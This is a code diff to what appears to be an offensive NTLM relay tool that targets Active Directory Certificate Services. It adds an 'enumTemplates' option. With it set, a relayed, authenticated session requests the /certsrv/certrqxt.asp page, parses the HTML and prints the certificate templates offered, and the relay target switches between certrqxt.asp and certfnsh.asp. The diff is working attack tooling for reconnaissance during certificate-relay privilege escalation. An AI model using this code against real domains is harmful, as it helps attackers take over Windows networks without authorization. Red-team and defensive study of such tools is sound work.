@@ -138,6 +138,23 @@ class ADCSAttackClient(ProtocolAttack):
                 % repr(self.client.user)
             )
             return
+        
+        if self.adcs_relay.enumTemplates:
+            from bs4 import BeautifulSoup
+            self.client.request("GET", "/certsrv/certrqxt.asp")
+            response = self.client.getresponse()
+            content = response.read()
+            soup = BeautifulSoup(content, 'html.parser')
+            select_tag = soup.find('select', {'name': 'lbCertTemplate', 'id':'lbCertTemplateID'})
+            if select_tag:
+                option_tags = select_tag.find_all('option')
+                print("Templates Found:")
+                for option in option_tags:
+                    value = option['value']
+                    split_value = value.split(';')
+                    if len(split_value) > 1:
+                        print(split_value[1])
+            return
 
         request_id = self.adcs_relay.request_id
         if request_id:
@@ -382,6 +399,7 @@ class Relay:
         forever=False,
         no_skip=False,
         timeout=5,
+        enumTemplates=False,
         debug=False,
         **kwargs
     ):
@@ -398,12 +416,16 @@ class Relay:
         self.verbose = debug
         self.interface = interface
         self.port = port
+        self.enumTemplates = enumTemplates
         self.kwargs = kwargs
 
         self.attacked_targets = []
         self.attack_lock = Lock()
-
-        target = "http://%s/certsrv/certfnsh.asp" % ca
+        
+        if self.enumTemplates:
+            target = "http://%s/certsrv/certrqxt.asp" % ca
+        else:
+            target = "http://%s/certsrv/certfnsh.asp" % ca
         logging.info("Targeting %s" % target)
 
         target = TargetsProcessor(
